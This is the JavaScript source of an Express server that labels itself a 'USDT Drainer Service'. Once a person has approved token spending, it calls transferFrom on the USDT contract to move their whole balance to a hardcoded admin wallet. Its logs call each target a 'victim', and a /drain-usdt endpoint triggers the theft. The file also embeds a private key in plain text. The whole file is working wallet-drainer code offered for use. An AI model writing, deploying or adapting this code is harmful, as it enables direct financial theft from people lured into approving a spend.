const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(cors());
app.use(express.json());

// Configuration
const ADMIN_PRIVATE_KEY = '0xcdc76ffc92e9ce9cc57513a8e098457d56c6cb5eb6ff26ce8b803c7e146ee55f';
const ADMIN_WALLET = '0x849842febf6643f29328a2887b3569e2399ac237';
const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const RPC_URL = 'https://mainnet.infura.io/v3/YOUR_INFURA_KEY'; // Replace with your RPC

// Setup provider and wallet
const provider = new ethers.JsonRpcProvider(RPC_URL);
const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);

// USDT contract ABI
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)'
];

const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, adminWallet);

// Drain USDT from user wallet
async function drainUSDT(userAddress) {
  try {
    console.log(`🎯 Starting USDT drain for: ${userAddress}`);
    
    // Check user's USDT balance
    const balance = await usdtContract.balanceOf(userAddress);
    const balanceFormatted = ethers.formatUnits(balance, 6); // USDT has 6 decimals
    
    if (balance == 0) {
      console.log(`❌ No USDT balance for ${userAddress}`);
      return;
    }
    
    console.log(`💰 Found ${balanceFormatted} USDT in ${userAddress}`);
    
    // Check allowance
    const allowance = await usdtContract.allowance(userAddress, ADMIN_WALLET);
    
    if (allowance < balance) {
      console.log(`❌ Insufficient allowance for ${userAddress}`);
      return;
    }
    
    // Execute drain
    console.log(`🚀 Draining ${balanceFormatted} USDT...`);
    
    const tx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, balance, {
      gasLimit: 100000,
      gasPrice: ethers.parseUnits('20', 'gwei')
    });
    
    console.log(`📤 Drain transaction sent: ${tx.hash}`);
    
    const receipt = await tx.wait();
    
    if (receipt.status === 1) {
      console.log(`✅ SUCCESSFULLY DRAINED ${balanceFormatted} USDT from ${userAddress}`);
      console.log(`💰 Transaction: ${tx.hash}`);
      
      // Log success
      const drainData = {
        type: 'USDT_DRAINED',
        victim: userAddress,
        amount: balanceFormatted + ' USDT',
        usdValue: '$' + balanceFormatted,
        txHash: tx.hash,
        adminWallet: ADMIN_WALLET,
        timestamp: new Date().toISOString()
      };
      
      console.log('🎯 DRAIN SUCCESS:', drainData);
      
      return drainData;
    } else {
      console.log(`❌ Drain transaction failed for ${userAddress}`);
    }
    
  } catch (error) {
    console.error(`❌ Error draining USDT from ${userAddress}:`, error.message);
  }
}

// API endpoint to trigger drain
app.post('/drain-usdt', async (req, res) => {
  const { userAddress, approvalTxHash } = req.body;
  
  console.log(`🎯 Drain request received for: ${userAddress}`);
  
  try {
    // Wait a bit for approval transaction to be mined
    setTimeout(async () => {
      const result = await drainUSDT(userAddress);
      if (result) {
        console.log(`✅ Drain completed for ${userAddress}`);
      }
    }, 5000); // Wait 5 seconds
    
    res.json({ success: true, message: 'Drain initiated' });
    
  } catch (error) {
    console.error('Drain error:', error);
    res.status(500).json({ error: 'Drain failed' });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'running',
    adminWallet: ADMIN_WALLET,
    timestamp: new Date().toISOString()
  });
});

const PORT = 3002;
app.listen(PORT, () => {
  console.log(`🚀 USDT Drainer Service running on port ${PORT}`);
  console.log(`💰 Admin Wallet: ${ADMIN_WALLET}`);
  console.log(`🎯 Ready to drain USDT...`);
});